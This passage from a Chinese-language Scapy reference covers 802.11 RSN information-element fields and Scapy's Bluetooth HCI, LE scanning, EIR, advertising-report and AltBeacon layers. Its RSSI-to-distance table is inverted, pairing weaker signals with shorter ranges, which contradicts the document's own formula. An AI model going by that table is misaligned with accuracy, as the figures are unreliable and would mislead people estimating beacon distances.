由802.11工作组使用.                    </span></li></ul><figure><table><thead><tr><th><span>OUI</span></th><th><span>Suite Type</span></th><th><span>Definition</span></th></tr></thead><tbody><tr><td><span>00-0F-AC (802.11)</span></td><td><span>0</span></td><td><span>Use the group cipher suite (only valid for pairwise ciphers)</span></td></tr><tr><td><span>00-0F-AC</span></td><td><span>1</span></td><td><span>WEP-40</span></td></tr><tr><td><span>00-0F-AC</span></td><td><span>2</span></td><td><span>TKIP</span></td></tr><tr><td><span>00-0F-AC</span></td><td><span>3</span></td><td><span>Reserved</span></td></tr><tr><td><span>00-0F-AC</span></td><td><span>4</span></td><td><span>CCMP[a]</span></td></tr><tr><td><span>00-0F-AC</span></td><td><span>5</span></td><td><span>WEP-104</span></td></tr><tr><td><span>Vendor OUI</span></td><td><span>Any value</span></td><td><span>Defined by vendor</span></td></tr></tbody></table></figure></li><li><p><span>Pairwise Cipher Suites (count + list)</span></p><ul><li><span>分组密码套件之后可以有几个成对的密码套件来保护单播帧.有一个双字节计数, 后面是一系列受支持的密码描述符.可以将套件选择器设置为零, 以指示只支持组密码套件.除了信息元素的大小之外, 对支持的成对密码的数量没有限制.</span></li></ul></li><li><p><span>Authentication and Key Management (AKM) suites (count + list)</span></p><ul><li><span>与成对密码套件选择器一样, 可能定义了多个身份验证类型.在计数之后, 有一系列四字节的套件标识符.与密码套件一样, 四字节标识符由一个OUI和一个套件类型号组成.表显示了标准的身份验证类型.                    </span></li></ul><figure><table><thead><tr><th><span>OUI</span></th><th><span>Suite type</span></th><th><span>Authentication</span></th><th><span>Key management</span></th></tr></thead><tbody><tr><td><span>00-0F-AC</span></td><td><span>1</span></td><td><span>802.1X or PMK caching</span></td><td><span>Key derivation from preshared master key, as described in Chapter 7</span></td></tr><tr><td><span>00-0F-AC</span></td><td><span>2</span></td><td><span>Pre-shared key</span></td><td><span>Key derivation from pre-shared key, as described in Chapter 7</span></td></tr><tr><td><span>Vendor OUI</span></td><td><span>Any</span></td><td><span>Vendor-specific</span></td><td><span>Vendor-specific</span></td></tr></tbody></table></figure></li><li><p><span>RSN Capabilties</span></p><ul><li><p><span>这个双字节字段由四个标记组成, 这些标记用于描述发送器的能力, 后面是必须设置为零的保留位</span></p></li><li><p><span>Pre-authentication</span></p><ul><li><span>AP可以设置此位, 以指示它可以与网络上的其他AP执行预认证, 以移动安全会话.否则, 这个位将被设置为0</span></li></ul></li><li><p><span>No Pairwise</span></p><ul><li><span>当一个端可以支持一个手动的WEP键和一个更强的单播键来广播数据时, 就设置这个位.虽然标准支持这种配置, 但是除非绝对必要, 否则不应该使用这种配置.</span></li></ul></li><li><p><span>Pairwise Replay Counter and Group Replay Counter</span></p><ul><li><span>对于新出现的服务质量扩展中定义的每个优先级, 可以维护单独的重播计数器.这些位元描述了端所支持的重播计数器的数目.</span></li></ul></li></ul></li><li><p><span>PMK list (count + list)</span></p><ul><li><span>当成对的主密钥被AP缓存时, 访问点之间可能会更快地切换.端可能会提供一个AP on关联的主密钥列表, 以试图绕过耗时的身份验证.</span></li></ul></li><li><p><img src="images/Scapy/2019-12-30-09-13-27.png" referrerpolicy="no-referrer"></p></li></ul></li><li><p><span>&quot;ESRates&quot;</span></p></li><li><p><span>&quot;PowerConstraint&quot;</span></p><ul><li><span>Power Constraint</span></li><li><span>功率约束信息元素用于允许网络描述到端的最大传输功率.除了规定的最高限额外, 可能还有另一个有效的最高限额.唯一的字段是一个单字节整数, 它是任何局部约束都可以通过其降低管最大的分贝数.例如, 如果调控的最大功率为10 dBm, 但是这个信息元素包含值2, 那么该端将其最大发射功率设置为8 dBm</span></li><li><img src="images/Scapy/2019-12-30-08-57-29.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>&quot;HTinfo&quot;</span></p><ul><li><span>Hopping Pattern Parameters</span></li></ul></li><li><p><span>&quot;reserved&quot;</span></p></li><li><p><span>&quot;Interworking&quot;</span></p></li><li><p><span>&quot;ExtendendCapatibilities&quot;</span></p></li><li><p><span>&quot;VHTCapabilities&quot;</span></p></li><li><p><span>&quot;vendor&quot;</span></p></li></ul></li><li><p><span>len</span></p></li><li><p><span>info</span></p><ul><li><span>字段值</span>
</details></li></ul></li></ul><h2 id='十三蓝牙'><span>十三.蓝牙</span></h2><p><a href='#23启动蓝牙'><span>启动蓝牙</span></a></p><h3 id='131bluetoothhcisocketscapylayersbluetoothbluetoothhcisocket'><span>13.1.BluetoothHCISocket:</span><code>scapy.layers.bluetooth.BluetoothHCISocket</code></h3><blockquote><p><span>这是与蓝牙控制器通信的“基础”级接口. 所有的东西都是建立在它上面的, 这代表了你可以用普通的蓝牙硬件得到的最接近物理层的东西. </span></p></blockquote><ul><li><p><span>iface</span></p><ul><li><p><span>如下iface应等于0, BluetoothHCISocket(0)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># hcitool dev</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Devices:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  hci0 &nbsp;  AA:AA:AA:AA:AA:AA</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 74px;"></div><div class="CodeMirror-gutters" style="display: none; height: 74px;"></div></div></div></pre></li></ul></li></ul><h3 id='132hcihdrscapylayersbluetoothhcihdr'><span>13.2.HCI_Hdr:</span><code>scapy.layers.bluetooth.HCI_Hdr</code></h3><blockquote><p><span>HCI header</span></p></blockquote><h3 id='133hcicommandhdrscapylayersbluetoothhcicommandhdr'><span>13.3.HCI_Command_Hdr:</span><code>scapy.layers.bluetooth.HCI_Command_Hdr</code></h3><blockquote><p><span>HCI Command header</span></p></blockquote><h3 id='134hcicmdlesetscanparametersscapylayersbluetoothhcicmdlesetscanparameters'><span>13.4.HCI_Cmd_LE_Set_Scan_Parameters:</span><code>scapy.layers.bluetooth.HCI_Cmd_LE_Set_Scan_Parameters</code></h3><blockquote><p><span>LE设置扫描参数</span></p></blockquote><ul><li><p><span>type</span></p><ul><li><span>1: active模式</span></li></ul></li><li><p><span>interval</span></p><ul><li><span>单位: slot:0.625ms</span></li><li><span>每隔多久进行一次监听</span></li></ul></li></ul><h3 id='135hcicmdlesetscanenablescapylayersbluetoothhcicmdlesetscanenable'><span>13.5.HCI_Cmd_LE_Set_Scan_Enable:</span><code>scapy.layers.bluetooth.HCI_Cmd_LE_Set_Scan_Enable</code></h3><blockquote><p><span>LE启用扫描</span></p></blockquote><ul><li><p><span>enable</span></p><ul><li><span>True: 启用</span></li><li><span>False: 不启用</span></li></ul></li><li><p><span>filter_dups</span></p><ul><li><span>True: 不显示重复的报告</span></li><li><span>False: 显示重复的报告, 因为有时包含不同的数据</span></li></ul></li></ul><h3 id='136eirhdrscapylayersbluetootheirhdr'><span>13.6.EIR_Hdr:</span><code>scapy.layers.bluetooth.EIR_Hdr</code></h3><blockquote><p><span>EIR Header</span></p></blockquote><ul><li><p><span>type</span></p><ul><li><p><span>取值(可填数字或字符串)</span></p><details></details><ul><li><span>详解: </span><a href='https://www.bluetooth.com/specifications/assigned-numbers/generic-access-profile' target='_blank' class='url'>https://www.bluetooth.com/specifications/assigned-numbers/generic-access-profile</a></li><li><span>0x01: &quot;flags&quot;</span></li><li><span>0x02: &quot;incomplete_list_16_bit_svc_uuids&quot;</span></li><li><span>0x03: &quot;complete_list_16_bit_svc_uuids&quot;</span></li><li><span>0x04: &quot;incomplete_list_32_bit_svc_uuids&quot;</span></li><li><span>0x05: &quot;complete_list_32_bit_svc_uuids&quot;</span></li><li><span>0x06: &quot;incomplete_list_128_bit_svc_uuids&quot;</span></li><li><span>0x07: &quot;complete_list_128_bit_svc_uuids&quot;</span></li><li><span>0x08: &quot;shortened_local_name&quot;</span></li><li><span>0x09: &quot;complete_local_name&quot;</span></li><li><span>0x0a: &quot;tx_power_level&quot;</span></li><li><span>0x0d: &quot;class_of_device&quot;</span></li><li><span>0x0e: &quot;simple_pairing_hash&quot;</span></li><li><span>0x0f: &quot;simple_pairing_rand&quot;</span></li><li><span>0x10: &quot;sec_mgr_tk&quot;</span></li><li><span>0x11: &quot;sec_mgr_oob_flags&quot;</span></li><li><span>0x12: &quot;slave_conn_intvl_range&quot;</span></li><li><span>0x14: &quot;list_16_bit_svc_sollication_uuids&quot;</span></li><li><span>0x15: &quot;list_128_bit_svc_sollication_uuids&quot;</span></li><li><span>0x16: &quot;svc_data_16_bit_uuid&quot;</span></li><li><span>0x17: &quot;pub_target_addr&quot;</span></li><li><span>0x18: &quot;rand_target_addr&quot;</span></li><li><span>0x19: &quot;appearance&quot;</span></li><li><span>0x1a: &quot;adv_intvl&quot;</span></li><li><span>0x1b: &quot;le_addr&quot;</span></li><li><span>0x1c: &quot;le_role&quot;</span></li><li><span>0x1d: &quot;simple_pairing_hash_256&quot;</span></li><li><span>0x1e: &quot;simple_pairing_rand_256&quot;</span></li><li><span>0x1f: &quot;list_32_bit_svc_sollication_uuids&quot;</span></li><li><span>0x20: &quot;svc_data_32_bit_uuid&quot;</span></li><li><span>0x21: &quot;svc_data_128_bit_uuid&quot;</span></li><li><span>0x22: &quot;sec_conn_confirm&quot;</span></li><li><span>0x23: &quot;sec_conn_rand&quot;</span></li><li><span>0x24: &quot;uri&quot;</span></li><li><span>0x25: &quot;indoor_positioning&quot;</span></li><li><span>0x26: &quot;transport_discovery&quot;</span></li><li><span>0x27: &quot;le_supported_features&quot;</span></li><li><span>0x28: &quot;channel_map_update&quot;</span></li><li><span>0x29: &quot;mesh_pb_adv&quot;</span></li><li><span>0x2a: &quot;mesh_message&quot;</span></li><li><span>0x2b: &quot;mesh_beacon&quot;</span></li><li><span>0x3d: &quot;3d_information&quot;</span></li><li><span>0xff: &quot;mfg_specific_data&quot;</span></li></ul><p></details></p></li></ul></li><li><p><span>len</span></p></li></ul><h3 id='137hcilemetaadvertisingreportscapylayersbluetoothhcilemetaadvertisingreport'><span>13.7.HCI_LE_Meta_Advertising_Report:</span><code>scapy.layers.bluetooth.HCI_LE_Meta_Advertising_Report</code></h3><blockquote><p><a href='https://www.silabs.com/community/wireless/bluetooth/knowledge-base.entry.html/2017/02/10/bluetooth_advertisin-hGsf' target='_blank' class='url'>https://www.silabs.com/community/wireless/bluetooth/knowledge-base.entry.html/2017/02/10/bluetooth_advertisin-hGsf</a></p></blockquote><details></details><ul><li><p><span>type</span></p><ul><li><p><a href='https://www.bluetooth.com/zh-cn/specifications/assigned-numbers/generic-access-profile/' target='_blank' class='url'>https://www.bluetooth.com/zh-cn/specifications/assigned-numbers/generic-access-profile/</a></p></li><li><p><span>0: conn_und</span></p><ul><li><span>ADV_IND: 可连接的无定向广告事件</span></li></ul></li><li><p><span>1</span></p><ul><li><span>ADV_DIRECT_IND：可连接的定向广告事件</span></li></ul></li><li><p><span>2</span></p><ul><li><span>ADV_NONCONN_IND：不可连接的无定向广告事件</span></li></ul></li><li><p><span>3</span></p><ul><li><span>SCAN_REQ：扫描请求</span></li></ul></li><li><p><span>4: scan_rsp</span></p><ul><li><span>CAN_RSP: 扫描响应</span></li></ul></li><li><p><span>5</span></p><ul><li><span>CONNECT_REQ：连接请求</span></li></ul></li><li><p><span>6</span></p><ul><li><span>ADV_SCAN_IND：可扫描的无定向广告事件</span></li></ul></li></ul></li><li><p><span>atype</span></p><ul><li><span>0: public</span></li><li><span>1: random</span></li></ul></li><li><p><span>addr </span></p><ul><li><span>LEMAC地址</span></li></ul></li><li><p><span>len  </span></p></li><li><p><span>data </span></p><ul><li><span>EIR_Hdr类型</span></li></ul></li><li><p><span>rssi</span></p><ul><li><p><span>RSSI代表接收信号强度指示器. 它是在接收设备上看到的信标信号的强度</span></p><figure><table><thead><tr><th><span>RSSI</span></th><th><span>Range(meters)</span></th></tr></thead><tbody><tr><td><span>-115 dBm</span></td><td><span>2</span></td></tr><tr><td><span>-84 dBm</span></td><td><span>4</span></td></tr><tr><td><span>-81 dBm</span></td><td><span>10</span></td></tr><tr><td><span>-77 dBm</span></td><td><span>20</span></td></tr><tr><td><span>-72 dBm</span></td><td><span>30</span></td></tr><tr><td><span>-69 dBm</span></td><td><span>40</span></td></tr><tr><td><span>-65 dBm</span></td><td><span>60</span></td></tr><tr><td><span>-59 dBm</span></td><td><span>70</span></td></tr></tbody></table></figure><ul><li><p><mjx-container class="MathJax" jax="SVG" style="position: relative;"><svg xmlns="http://www.w3.org/2000/svg" width="15.4ex" height="2.751ex" role="img" focusable="false" viewBox="0 -1016 6806.7 1216" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style="vertical-align: -0.452ex;"><defs><path id="MJX-1-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path><path id="MJX-1-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path id="MJX-1-TEX-N-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path><path id="MJX-1-TEX-I-1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path><path id="MJX-1-TEX-I-1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path><path id="MJX-1-TEX-N-2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path><path id="MJX-1-TEX-I-1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path><path id="MJX-1-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path><path id="MJX-1-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path><path id="MJX-1-TEX-I-1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">距</text></g><g data-mml-node="mtext" transform="translate(884,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">离</text></g><g data-mml-node="mo" transform="translate(2045.8,0)"><use data-c="3D" xlink:href="#MJX-1-TEX-N-3D"></use></g><g data-mml-node="msup" transform="translate(3101.6,0)"><g data-mml-node="mn"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use><use data-c="30" xlink:href="#MJX-1-TEX-N-30" transform="translate(500,0)"></use></g><g data-mml-node="mfrac" transform="translate(1033,393.1) scale(0.707)"><g data-mml-node="mrow" transform="translate(220,398) scale(0.707)"><g data-mml-node="mi"><use data-c="1D440" xlink:href="#MJX-1-TEX-I-1D440"></use></g><g data-mml-node="mi" transform="translate(1051,0)"><use data-c="1D443" xlink:href="#MJX-1-TEX-I-1D443"></use></g><g data-mml-node="mo" transform="translate(1802,0)"><use data-c="2212" xlink:href="#MJX-1-TEX-N-2212"></use></g><g data-mml-node="mi" transform="translate(2580,0)"><use data-c="1D445" xlink:href="#MJX-1-TEX-I-1D445"></use></g><g data-mml-node="mi" transform="translate(3339,0)"><use data-c="1D460" xlink:href="#MJX-1-TEX-I-1D460"></use></g><g data-mml-node="mi" transform="translate(3808,0)"><use data-c="1D460" xlink:href="#MJX-1-TEX-I-1D460"></use></g><g data-mml-node="mi" transform="translate(4277,0)"><use data-c="1D456" xlink:href="#MJX-1-TEX-I-1D456"></use></g></g><g data-mml-node="mrow" transform="translate(1186.6,-345) scale(0.707)"><g data-mml-node="mn"><use data-c="31" xlink:href="#MJX-1-TEX-N-31"></use><use data-c="30" xlink:href="#MJX-1-TEX-N-30" transform="translate(500,0)"></use></g><g data-mml-node="mi" transform="translate(1000,0)"><use data-c="1D441" xlink:href="#MJX-1-TEX-I-1D441"></use></g></g><rect width="3468.2" height="60" x="120" y="220"></rect></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline"><math xmlns="http://www.w3.org/1998/Math/MathML"><mtext>距</mtext><mtext>离</mtext><mo>=</mo><msup><mn>10</mn><mfrac><mrow><mi>M</mi><mi>P</mi><mo>−</mo><mi>R</mi><mi>s</mi><mi>s</mi><mi>i</mi></mrow><mrow><mn>10</mn><mi>N</mi></mrow></mfrac></msup></math></mjx-assistive-mml></mjx-container><script type="math/tex">距离 = 10^\frac{MP - Rssi}{10N}</script></p><ul><li><p><span>单位: 米</span></p></li><li><p><span>MP: Measured Power测量功率</span></p><ul><li><span>例:Measured Power = -69 (for kontakt BLE beacons)</span></li></ul></li><li><p><span>N: 常数取决于环境因素,范围2-4</span></p></li></ul></li></ul></li></ul></li></ul><p></details></p><h3 id='138hcilemetaadvertisingreportsscapylayersbluetoothhcilemetaadvertisingreports'><span>13.8.HCI_LE_Meta_Advertising_Reports:</span><code>scapy.layers.bluetooth.HCI_LE_Meta_Advertising_Reports</code></h3><ul><li><p><span>len</span></p><ul><li><span>长度</span></li></ul></li><li><p><span>reports</span></p><ul><li><span>HCI_LE_Meta_Advertising_Report列表</span></li></ul></li></ul><h3 id='139altbeaconscapycontribaltbeaconaltbeacon'><span>13.9.AltBeacon:</span><code>scapy.contrib.altbeacon.AltBeacon</code></h3><blockquote><p><span>AltBeacon是一个协议规范, 为邻近信标广告定义了消息格式. 设备发送AltBeacon邻近信标广告, 用于发信号通知其邻近的接收器. 发出的消息的内容包含接收设备可用于标识信标并计算其与信标的相对距离的信息. 接收设备可以将该信息用作上下文触发来执行过程并实现与靠近发射信标有关的行为.</span></p></blockquote><ul><li><p><span>用法</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># 加载AltBeacon</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">load_contrib</span>(<span class="cm-string">'altbeacon'</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">ab</span> <span class="cm-operator">=</span> <span class="cm-variable">AltBeacon</span>(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">id1</span><span class="cm-operator">=</span><span class="cm-string">'2f234454-cf6d-4a0f-adf2-f4911ba9ffa6'</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">id2</span><span class="cm-operator">=</span><span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">id3</span><span class="cm-operator">=</span><span class="cm-number">2</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">tx_power</span><span class="cm-operator">=-</span><span class="cm-number">59</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">bt</span>.<span class="cm-property">sr</span>(<span class="cm-variable">ab</span>.<span class="cm-property">build_set_advertising_data</span>())</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 271px;"></div><div class="CodeMirror-gutters" style="display: none; height: 271px;"></div></div></div></pre></li></ul><details></details><ul><li><p><span>header</span></p></li><li><p><span>id1</span></p><ul><li><p><span>组织id</span></p></li><li><p><span>UUID</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">UUID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = time-low "-" time-mid "-"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  time-high-and-version "-"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  clock-seq-and-reserved</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  clock-seq-low "-" node</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time-low &nbsp; &nbsp; 